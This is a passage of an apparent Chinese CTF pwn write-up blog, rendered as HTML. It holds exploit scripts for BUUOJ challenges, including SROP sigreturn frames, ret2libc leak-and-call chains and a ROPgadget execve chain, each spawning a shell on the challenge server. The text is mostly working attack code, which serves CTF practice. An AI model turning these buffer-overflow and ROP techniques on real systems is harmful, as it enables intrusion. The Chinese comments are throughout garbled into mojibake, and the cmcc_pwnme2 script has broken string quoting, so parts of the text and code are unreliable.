title="0x3d.ciscn_2019_es_7"></a>0x3d.ciscn_2019_es_7</h2><p><code>SROP</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/65&quot;)</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26571</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/65&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">xor_xor_rax = <span class="number">0x04004F1</span></span><br><span class="line">mov_rax_15_ret = <span class="number">0x004004DA</span></span><br><span class="line">syscall_ret = <span class="number">0x0400517</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span>+ p64(xor_xor_rax))</span><br><span class="line">c.recv(<span class="number">32</span>)</span><br><span class="line">stack_addr = u64(c.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;stack: &quot;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line">c.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bin_sh = stack_addr - 0x148  # local</span></span><br><span class="line">bin_sh = stack_addr - <span class="number">0x118</span>    <span class="comment"># remote</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exe_frame= SigreturnFrame()</span><br><span class="line">exe_frame.rax = <span class="number">59</span></span><br><span class="line">exe_frame.rdi = bin_sh</span><br><span class="line">exe_frame.rsi = <span class="number">0</span></span><br><span class="line">exe_frame.rdx = <span class="number">0</span></span><br><span class="line">exe_frame.rsp = stack_addr</span><br><span class="line">exe_frame.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(mov_rax_15_ret) + p64(syscall_ret) + <span class="built_in">bytes</span>(exe_frame)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.3ok685fst0zk.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.58yp45la7am8.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.46oechceqsao.webp"></p><p>â€‹    </p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230312/%E5%9B%BE%E7%89%87.4xaneo52tf9c.webp"></p><p><mark>patchefæ”¹åº“åï¼š</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230317/%E5%9B%BE%E7%89%87.5cvayb7zu6ww.webp"></p><h2 id="0x3e-jarvisoj-level5"><a href="#0x3e-jarvisoj-level5" class="headerlink" title="0x3e.jarvisoj_level5"></a>0x3e.jarvisoj_level5</h2><p><code>ret2csu</code></p><p>å‚è§<code>0x28</code></p><h2 id="0x3f-360chunqiu2017-smallestï¼ˆæœªå®Œå…¨ç†è§£ï¼‰"><a href="#0x3f-360chunqiu2017-smallestï¼ˆæœªå®Œå…¨ç†è§£ï¼‰" class="headerlink" title="0x3f.360chunqiu2017_smallestï¼ˆæœªå®Œå…¨ç†è§£ï¼‰"></a>0x3f.360chunqiu2017_smallestï¼ˆ<mark>æœªå®Œå…¨ç†è§£ï¼‰</mark></h2><p><code>SROP</code>   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># local</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/smallest&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x4000BE</span> <span class="comment">#æºä»£ç syscallå¤„åœ°å€</span></span><br><span class="line">start_addr = <span class="number">0x4000B0</span>  <span class="comment">#æºä»£ç xor rax,raxå¤„åœ°å€</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#éƒ¨ç½²ä¸‰ä¸ªstart_addrï¼Œå®Œæˆä¸‰æ¬¡readå‡½æ•°çš„è°ƒç”¨</span></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¦†ç›–ç¬¬äºŒä¸ªstart_addrçš„æœ€åä¸€ä¸ªå­—èŠ‚å˜æˆ0x4000B3ï¼Œè¶Šè¿‡å¯¹raxå¯„å­˜å™¨çš„æ¸…é›¶ï¼Œä½¿å¾—raxå¯„å­˜å™¨å€¼å˜ä¸º1</span></span><br><span class="line">c.send(<span class="string">b&#x27;\xb3&#x27;</span>)  </span><br><span class="line"><span class="comment"># stack_addr = u64(c.recv()[8:16]) #æ¥æ”¶æ¥ä¸‹è¦è¦éƒ¨ç½²çš„æ ˆé¡¶åœ°å€</span></span><br><span class="line">stack_addr = u64(c.recv()[<span class="number">0x188</span>:<span class="number">0x190</span>])</span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = <span class="number">0</span> <span class="comment">#readå‡½æ•°ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">read.rdi = <span class="number">0</span>  <span class="comment">#readå‡½æ•°ä¸€å‚</span></span><br><span class="line">read.rsi = stack_addr  <span class="comment">#readå‡½æ•°äºŒå‚</span></span><br><span class="line">read.rdx = <span class="number">0x400</span>  <span class="comment">#readå‡½æ•°ä¸‰å‚</span></span><br><span class="line">read.rsp = stack_addr  <span class="comment">#å’Œrsiå¯„å­˜å™¨ä¸­çš„å€¼ä¿æŒä¸€è‡´ï¼Œç¡®ä¿readå‡½æ•°å†™çš„æ—¶å€™rspæŒ‡å‘stack_addr</span></span><br><span class="line">read.rip = syscall_ret <span class="comment">#ä½¿å¾—ripæŒ‡å‘syscallçš„ä½ç½®ï¼Œåœ¨éƒ¨ç½²å¥½readå‡½æ•°ä¹‹åèƒ½ç›´æ¥è°ƒç”¨</span></span><br><span class="line">payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">bytes</span>(read)</span><br><span class="line">c.send(payload)</span><br><span class="line">c.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])  <span class="comment">#è¾“å…¥15ä¸ªå­—èŠ‚ä½¿å¾—raxå¯„å­˜å™¨çš„å€¼ä¸º15ï¼Œè¿›è¡Œsigreturnè°ƒç”¨</span></span><br><span class="line"></span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax = <span class="number">59</span></span><br><span class="line">execve.rdi = stack_addr + <span class="number">0x200</span>  </span><br><span class="line">execve.rsi = <span class="number">0x0</span> <span class="comment">#execveå‡½æ•°äºŒå‚</span></span><br><span class="line">execve.rdx = <span class="number">0x0</span> <span class="comment">#execveå‡½æ•°äºŒå‚</span></span><br><span class="line">execve.rsp = stack_addr </span><br><span class="line">execve.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">bytes</span>(execve)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(frame_payload))</span><br><span class="line"><span class="comment"># å°†execveå‡½æ•°è°ƒç”¨å’Œ/bin/shå­—ç¬¦ä¸²ä¸€èµ·éƒ¨ç½²åˆ°æ ˆä¸­</span></span><br><span class="line">payload = frame_payload + (<span class="number">0x200</span> - <span class="built_in">len</span>(frame_payload)) * <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">c.send(payload)</span><br><span class="line">c.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26828</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4000B0</span></span><br><span class="line"></span><br><span class="line">payload1 = p64(main_addr) * <span class="number">3</span></span><br><span class="line">c.send(payload1)</span><br><span class="line">c.send(<span class="string">b&#x27;\xb3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(c.recv()[<span class="number">0x188</span>:<span class="number">0x190</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] stack_addr = &#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># sys_read</span></span><br><span class="line">syscall = <span class="number">0x4000BE</span> </span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = <span class="number">0</span></span><br><span class="line">read.rsi = stack_addr</span><br><span class="line">read.rdi = <span class="number">0</span></span><br><span class="line">read.rdx = <span class="number">0x400</span></span><br><span class="line">read.rsp = stack_addr</span><br><span class="line">read.rip = syscall</span><br><span class="line"></span><br><span class="line">payload2 = p64(main_addr) + p64(<span class="number">0</span>) + <span class="built_in">bytes</span>(read)</span><br><span class="line">c.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read 15 bytes --&gt; rax = 15</span></span><br><span class="line">payload3 = p64(syscall) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span></span><br><span class="line">c.send(payload3)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sys_execve</span></span><br><span class="line"><span class="built_in">exec</span> = SigreturnFrame()                                                        </span><br><span class="line"><span class="built_in">exec</span>.rax = <span class="number">59</span></span><br><span class="line"><span class="built_in">exec</span>.rdi = stack_addr + <span class="number">0x200</span>  </span><br><span class="line"><span class="built_in">exec</span>.rsi = <span class="number">0</span>   </span><br><span class="line"><span class="built_in">exec</span>.rdx = <span class="number">0</span>                                                                   </span><br><span class="line"><span class="built_in">exec</span>.rsp = stack_addr                                  </span><br><span class="line"><span class="built_in">exec</span>.rip = syscall                                                         </span><br><span class="line">payload4 = (p64(main_addr) + p64(<span class="number">0</span>) + <span class="built_in">bytes</span>(<span class="built_in">exec</span>)).ljust(<span class="number">0x200</span>, <span class="string">b&#x27;a&#x27;</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">c.send(payload4)                                                                                                                               </span><br><span class="line">sleep(<span class="number">1</span>)   </span><br><span class="line"><span class="comment"># read 15 bytes --&gt; rax = 15</span></span><br><span class="line">c.send(payload3)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x40-cmcc-pwnme1"><a href="#0x40-cmcc-pwnme1" class="headerlink" title="0x40.cmcc_pwnme1"></a>0x40.cmcc_pwnme1</h2><p><code>ret2libc3 &amp; recv() </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/67&quot;)</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29880</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/67&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/libc/16libc32.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  <span class="comment"># 0804a028</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  <span class="comment"># 08048548</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 080486F4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">0x4</span>) +p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;&gt;&gt; 6. Exit    \n&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please input the name of fruit:&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.recvline())</span><br><span class="line">puts_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">0x4</span>) +p32(system_addr) + p32(main_addr) + p32(bin_sh)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;&gt;&gt; 6. Exit    \n&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please input the name of fruit:&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230313/%E5%9B%BE%E7%89%87.1tkvyskgoha8.webp"></p><h2 id="0x41-cmcc-pwnme2-why-libc3-can-not"><a href="#0x41-cmcc-pwnme2-why-libc3-can-not" class="headerlink" title="0x41.cmcc_pwnme2(why libc3 can not?)"></a>0x41.cmcc_pwnme2(why libc3 can not?)</h2><p><code>ROP &amp; little trick </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28161</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/68&quot;</span>)c<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">context.arch = &#x27;</span>i386<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exec_string_addr =0x080485cb</span></span><br><span class="line"><span class="string">string_addr = 0x0804a060</span></span><br><span class="line"><span class="string">gets_addr = elf.sym[&#x27;</span>gets<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c.recvuntil(&#x27;</span>Please <span class="built_in">input</span>:\n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload= b&#x27;</span>a<span class="string">&#x27;*(0x6c+4)+ p32(gets_addr) + p32(exec_string_addr) + p32(string_addr)</span></span><br><span class="line"><span class="string">c.sendline(payload)</span></span><br><span class="line"><span class="string">c.sendline(b&#x27;</span>./flag<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">c.interactive()</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230313/%E5%9B%BE%E7%89%87.2c52bu77hegw.webp"></p><p>â€‹    æ²¡å¤ªææ‡‚ä¸ºä»€ä¹ˆä¸èƒ½ç”¨<code>ret2libc3</code></p><h2 id="0x42-picoctf-2018-got-shell"><a href="#0x42-picoctf-2018-got-shell" class="headerlink" title="0x42.picoctf_2018_got_shell"></a>0x42.picoctf_2018_got_shell</h2><p><code>trick &amp; replace</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230313/%E5%9B%BE%E7%89%87.35r8dvhlv79c.webp"></p><p>â€‹    æ„Ÿè§‰<code>picoctf</code>å‡ºçš„é¢˜éƒ½å¾ˆæœ‰è„‘æ´çš„æ„Ÿè§‰ã€‚</p><p>â€‹    <mark>got</mark>_shell !!!  ç¬¬ä¸€ååº”åº”è¯¥æ˜¯æ‰“gotè¡¨è€Œä¸æ˜¯get_shell !</p><h2 id="0x43-picoctf-2018-can-you-gets-me"><a href="#0x43-picoctf-2018-can-you-gets-me" class="headerlink" title="0x43.picoctf_2018_can_you_gets_me"></a>0x43.picoctf_2018_can_you_gets_me</h2><p><code>é™æ€é“¾æ¥ &amp; ret2libc3</code></p><blockquote><p>ROPgadget â€“binary 70 â€“ropchain</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/70&quot;)</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25056</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1c</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span 